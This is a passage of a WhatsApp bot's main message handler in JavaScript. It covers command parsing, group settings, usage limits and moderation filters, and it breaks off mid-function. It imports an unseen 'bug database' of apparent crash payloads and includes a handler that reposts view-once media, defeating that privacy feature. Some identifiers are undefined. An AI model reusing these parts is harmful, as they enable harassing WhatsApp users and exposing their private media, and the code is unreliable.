/*Sc Shiroko-Botz
Remake By DitzCodexzy
Source Sc Remake Nya
https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W
*/


require('./settings');
const {
	downloadContentFromMessage
} = require('@whiskeysockets/baileys')
const baileys = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const { os, axios, chalk, cheerio, child_process, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, googleTTS, nodecron, maker } = modul
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const osu = require('node-os-utils')
const path = require('path');
const https = require('https');
const fse = require('fs-extra');
const crypto = require('crypto')
const yts = require('yt-search');
const ytdl = require('@distube/ytdl-core');
const cron = require('node-cron');
const { color, bgcolor } = require('./lib/color')
const request = require('request');
const gradient = require('gradient-string');
const { JSDOM } = require('jsdom');
const canvafy = require('canvafy')
const agent = require('superagent');
const webp = require('node-webpmux');
const { performance } = require('perf_hooks');
const { exec, spawn, execSync } = require('child_process');
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const fg = require('api-dylux');
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2');

const prem1 = require('./src/premium');
const simion = JSON.parse(fs.readFileSync('./database/simion.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/badword.json'))

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
const thumb = fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')

//media
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/xeonvn.json'));
const StickerXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/xeonsticker.json'));
const ImageXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/xeonimage.json'));
const VideoXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/xeonvideo.json'));
const DocXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/doc.json'));
const ZipXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/zip.json'));
const ApkXeon = JSON.parse(fs.readFileSync('./YutaMedia/database/apk.json'));

const prem = require('./src/premium');
const banned = JSON.parse(fs.readFileSync('./database/banned.json', 'utf8'))
const owner = JSON.parse(fs.readFileSync('./src/owner.json'));
const { TelegraPh, UploadFileUgu, catbox } = require('./lib/uploader');
const uploadImage = require('./lib/uploadImage');
const {
    toAudio,
    toPTT,
    toVideo,
    addExifAvatar,
    makeid,
  Telesticker,
  formatBytes,
  formatDuration
} = require('./lib/converter');
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list');
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js');
const { imageToWebp, videoToWebp, writeExif, writeExifImg, writeExifVid } = require('./lib/exif');
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./lib/screaper');
const { gameSlot, gameCasinoSolo, gameMerampok, gameTangkapOr, daily, transferLimit, transferUang, buy, setLimit, setUang } = require('./lib/game');
const { pinterest, wallpaper, wikimedia, quotesAnime, happymod, umma, ringtone, jadwalsholat, styletext } = require('./lib/scraper');
const { formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, webApi, parseMention, generateProfilePicture, getRandom, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, generateToken, batasiTeks, randomText, isEmoji, getAllHTML, fetchBuffer, GIFBufferToVideoBuffer } = require('./lib/function');
// Read Database
const yutaverifieduser = JSON.parse(fs.readFileSync('./src/user.json'));
const mute = JSON.parse(fs.readFileSync('./database/mute.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const cmdha = JSON.parse(fs.readFileSync('./database/command.json'));
const pler = JSON.parse(fs.readFileSync('./src/idgrup.json').toString())
//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')

//=====================================================//
global.db.data = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
...(global.db.data || {})
}
//=====================================================//

// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.data.others.vote = []

module.exports = Yuta = async (Yuta, m, chatUpdate, store) => {
try {
const {
type
} = m

//time
const ytime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const ydate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss') 

var date = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));

var detik1 = date.toLocaleTimeString('id', {second: '2-digit'});
var menit1 = date.toLocaleTimeString('id', {minute: '2-digit'});
var jam1 = date.toLocaleTimeString('id', {hour: '2-digit'});

    bulan1 = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
    hari1 = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu'];
    op1 = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60'];
    
    var hariini = date.getDay(),
    hari = hari1[hariini];
    
    var tanggal = date.getDate();
    
    var bulanini = date.getMonth(),
    bulan = bulan1[bulanini];
    
    var tahun = date.getFullYear();
    
    var detikk = date.getSeconds(),
    detikNow = op1[detikk];
    
    var menitt = date.getMinutes(),
    menitNow = op1[menitt];
    
    var jamm = date.getHours(),
    jamNow = op1[jamm];

//========= SALAM V1 =========//
    const slmv1 = date.getHours();
    var ucpv1
    if (slmv1 >= 3) {
        ucpv1 = "Pagi"
    }
    if (slmv1 >= 10) {
        ucpv1 = "Siang"
    }
    if (slmv1 >= 15) {
        ucpv1 = "Sore"
    }
    if (slmv1 >= 18) {
        ucpv1 = "Malam"
    }
    var salamv1 = ucpv1
    
//========= SALAM V2 =========//
    const slmv2 = date.getHours();
    var ucpv2 = "Belum tidur kah?"
    if (slmv2 >= 4) {
        ucpv2 = "Selamat Shubuh 🌃"
    }
    if (slmv2 >= 5) {
        ucpv2 = "Selamat Pagi 🌄"
    }
    if (slmv2 >= 10) {
        ucpv2 = "Selamat Siang ☀️"
    }
    if (slmv2 >= 15) {
        ucpv2 = "Selamat Sore 🌇"
    }
    if (slmv2 >= 18) {
        ucpv2 = "Selamat Malam 🌙"
    }
    if (slmv2 >= 23 && slmv2 >= 0o0) {
        ucpv2 = "Selamat Dini Hari 🌌"
    }
    var salamv2 = ucpv2
    
    
var tampilHari = salamv1 + " Hari";
var tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
var tampilWaktu1 = jamm + ":" + menitt + ":" + detikk
var tampilWaktu2 = jam1 + ":" + menit1 + ":" + detik1
var tampilWaktu = jamNow + ":" + menitNow + ":" + detikNow;
var tglCMD = tampilHari + " | " + tampilWaktu + " | " + tampilTanggal
    
const botNumber = await Yuta.decodeJid(Yuta.user.id)
const YutaTheCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '.'
 const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '

async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: Yuta.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Yuta.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Yuta.ev.emit('messages.upsert', msg)
}
         
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : '.'
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '

        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = xprefix ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix ?? global.prefix
        global.prefix = prefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        // SINGEL PREFIX
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        // MULTI PREFIX
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : '.'
        const leobody = body.startsWith(pric)
        const isCommand = leobody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const pushname = m.pushName || "Gada Nama"
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isYutaMedia = m.mtype
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const senderNumber = sender.split('@')[0]
		const groupMetadata = m.isGroup ? await Yuta.groupMetadata(m.chat).catch(e => {}) : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmin = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false
        const SimiActive = m.isGroup ? simion.includes(from) : false
    	const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
     const isMute= mute.includes(m.chat) ? true : false
    	const isUser = yutaverifieduser.includes(sender)
    	const users = global.db.data.users[m.sender]
    	const isBan = banned.includes(m.sender)
        const isRegistered = checkRegisteredUser(m.sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByreply ? mentionByreply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByreply ? mentionByreply : q ? numberQuery : false
        const clientId = Yuta.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? Yuta.user.id.split(':')[0] + "@s.whatsapp.net" || Yuta.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
		try {
		const isNumber = x => typeof x === 'number' && !isNaN(x)
		const isBoolean = x => typeof x === 'boolean' && Boolean(x)
		let user = global.db.data.users[m.sender]
		let limitUser = user ? (user.vip ? global.limit.vip : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free) : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free
		let uangUser = user ? (user.vip ? global.uang.vip : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free) : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free
		if (typeof user !== 'object') global.db.data.users[m.sender] = {}
		if (user) {
			if (!('vip' in user)) user.afkReason = false
			if (!isNumber(user.afkTime)) user.afkTime = -1
			if (!("banned" in user)) user.banned = false
			if (!isNumber(user.bannedDate)) user.bannedDate = 0
			if (!('afkReason' in user)) user.afkReason = ''
			if (!("registered" in user)) user.registered = false
		    if (!("sn" in user)) user.sn = ""
			if (!isNumber(user.limit)) user.limit = limitUser
			if (!('uang' in user)) user.uang = uangUser
			if (!('lastclaim' in user)) user.lastclaim = new Date * 1
			if (!('lastrampok' in user)) user.lastrampok = new Date * 1
		} else {
			global.db.data.users[m.sender] = {
				vip: false,
				afkTime: -1,
				afkReason: '',
				registered: false,
				banned: false,
				bannedDate: 0,
				sn: '',
				limit: limitUser,
				uang: uangUser,
				lastclaim: new Date * 1,
				lastrampok: new Date * 1,
			}
		}
			let group = global.db.data.groups[m.chat]
			if (typeof group !== 'object') global.db.data.groups[m.chat] = {}
			if (group) {
				if (!('ntnsfw' in group)) group.ntnsfw = false
				  if (!('welcome' in group)) group.welcome = false
				  if (!('welc_mess' in group)) group.welc_mess = ''
				  if (!('gbye_mess' in group)) group.gbye_mess = ''
                  if (!('setinfo' in group)) group.setinfo = false
				  if (!('badword' in group)) group.badword = false
                  if (!('antiforeignnum' in group)) group.antiforeignnum = false
                  if (!('antibot' in group)) group.antibot = false
                  if (!('antiviewonce' in group)) group.antiviewonce = false
                  if (!('antispam' in group)) group.antispam = false
                  if (!('antimedia' in group)) group.media = false
                  if (!('antivirtex' in group)) group.antivirtex = false
                  if (!('antiimage' in group)) group.antiimage = false
                  if (!('antivideo' in group)) group.video = false
                  if (!('antiaudio' in group)) group.antiaudio = false
                  if (!('antipoll' in group)) group.antipoll = false
                  if (!('antisticker' in group)) group.antisticker = false
                  if (!('anticontact' in group)) group.anticontact = false
                  if (!('antilocation' in group)) group.antilocation = false
                  if (!('antidocument' in group)) group.antidocument = false
                  if (!('antilink' in group)) group.antilink = false
                  if (!('antilinkgc' in group)) group.antilinkgc = false
                  if (!('antilinkch' in group)) group.antilinkch = false
                  if (!('antilinknumber' in group)) group.antilinknumber = false
                  if (!('IsMute' in group)) group.mute = false
                  if (!('antipromotion' in group)) group.antipromotion = false
                  if (!('antidelete' in group)) group.antidelete = true
			} else {
				global.db.data.groups[m.chat] = {
				  ntsfw: false,
				  welcome: false,
				  welc_mess: '',
				  gbye_mess: '',
				  setinfo: false,
				  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antilinkgc: false,
                  antilinkch: false,
                  antilinknumber: false,
                  antipromotion: false,
                  antidelete: true
				}
			}
		    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            	if (!('anticall' in setting)) setting.anticall = false
               if (!('antiswview' in setting)) setting.antiswview = false
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
            } else global.db.data.settings[botNumber] = {
               anticall: false,
           	antiswview: false,
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,               
            }
	} catch (e) {
		throw e;
	}
		
		const isVip = global.db.data.users[m.sender] ? global.db.data.users[m.sender].vip : false
		const isPremium = YutaTheCreator || prem.checkPremiumUser(m.sender, premium) || false
		const AntiNsfw = m.isGroup ? global.db.data.groups[m.chat].ntnsfw : false
		
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
		
		if (!Yuta.public) {
			if (!m.key.fromMe) return
	   }
		if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
		let chat = global.db.data.chats[m?.chat]
		if (chat && chat.isBanned && !YutaIsCreator) return
	  }
		const userId = m.sender

		if (m.isGroup && isMute) {
		if (!isAdmin && !YutaTheCreator) return
      }
	
		async function limitAbis() {
			replygcyuta('Yah, Limit kamu habis Nunggu jam 12 yak.')
		}
		// Variabel Limit User
		const limituser = db.data.users[m?.sender].limit

     //limit func
		async function useLimit(amount = 1) {
			if (limituser < 1) { 
	       } else {
		      db.data.users[m?.sender].limit -= amount
			  //db.data.users[m?.sender].totalLimit += amount
			     replygcyuta(`Limit Anda Berkurang ${amount} limit\nSisa: ${db.data.users[sender].limit} limit`)
		       }
}
		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(global.db.data.users)
			for (let jid of user) {
				const limitUser = global.db.data.users[jid].vip ? global.limit.vip : prem.checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
				global.db.data.users[jid].limit = limitUser
				console.log('Limit Reseted')
				Yuta.sendMessage(jidgroupnotif, { text:`Limit Reseted`});
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Kolkata'
		})


		if (db.data.settings[botNumber].online) {
	      if (isCommand) {
		   DitzCodexzy.sendPresenceUpdate('unavailable', from)
         }
       }	
		
		//Log
if (isCommand) {
console.log(
gradient.rainbow(`================================\n`),
chalk.black(chalk.bgGreen(`[ Command ]`)), gradient.rainbow(`==> ${pushname}`), chalk.bgHex('#FFA500').underline(budy)
)
console.log(gradient.rainbow(`Dari ==> ${m.key.remoteJid}`)
)
console.log(chalk.white(date))
console.log(gradient.rainbow(`================================`))
}

if (m.message) {
console.log(
gradient.rainbow(`================================\n`),
chalk.black(chalk.bgYellow(`[ Message ]`)), gradient.rainbow(`==> ${pushname}`), chalk.bgHex('#FFA500').underline(budy)
)
console.log(gradient.rainbow(`Dari ==> ${m.key.remoteJid}`)
)
console.log(chalk.white(date))
console.log(gradient.rainbow(`================================`))
}
		
		// Grup Only
        if (!m.isGroup && !YutaTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcyuta(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!YutaTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcyuta("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
		
		// Auto Read
		if (db.data.settings[botNumber].autoread) {
            Yuta.readMessages([m.key]);
        }
        
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            Yuta.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
        
        //auto type
        if (db.data.settings[botNumber].autotype){
        if (m.message) {
        	let xeonpos = ['composing']
            Yuta.sendPresenceUpdate(xeonpos, m.chat)
        }
        }
        
        //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (m.message) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            Yuta.sendPresenceUpdate(xeonmix2, m.chat)
        }
        }
        
        //autorecord
        if (db.data.settings[botNumber].autorecord){
        if (m.message) {
        	let xeonpos = ['recording']
            Yuta.sendPresenceUpdate(xeonpos, m.chat)
        }
        }
        
        //unavailable
        if (db.data.settings[botNumber].online) {
        	if (isCmd) {
        	Yuta.sendPresenceUpdate('unavailable', m.chat)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return Yuta.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return Yuta.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return Yuta.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.groups[m.chat].antiforeignnum === true){ 
        	if (YutaTheCreator || isAdmin || !isBotAdmin) return
            Yuta.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await Yuta.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await Yuta.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        Yuta.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcyuta('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await Yuta.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        Yuta.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcyuta('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                Yuta.sendImageAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                Yuta.sendVideoAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        //antibot
        if (db.data.groups[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !m.isBotAdmin){		  
        } else {
          replygcyuta(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await Yuta.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
   
		//antiviewonce
    if ( db.data.groups[m.chat].antiviewonce && m.isGroup && m.mtype == "viewOnceMessageV2") {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Yuta.sendMessage(m.chat, { forward: val }, { quoted: m })    	
    }
    
    // Anti promotion
if (db.data.groups[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmin) return
if(YutaTheCreator) return
if (isAdmin) return
Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
Yuta.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

//respond
        if (db.data.groups[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
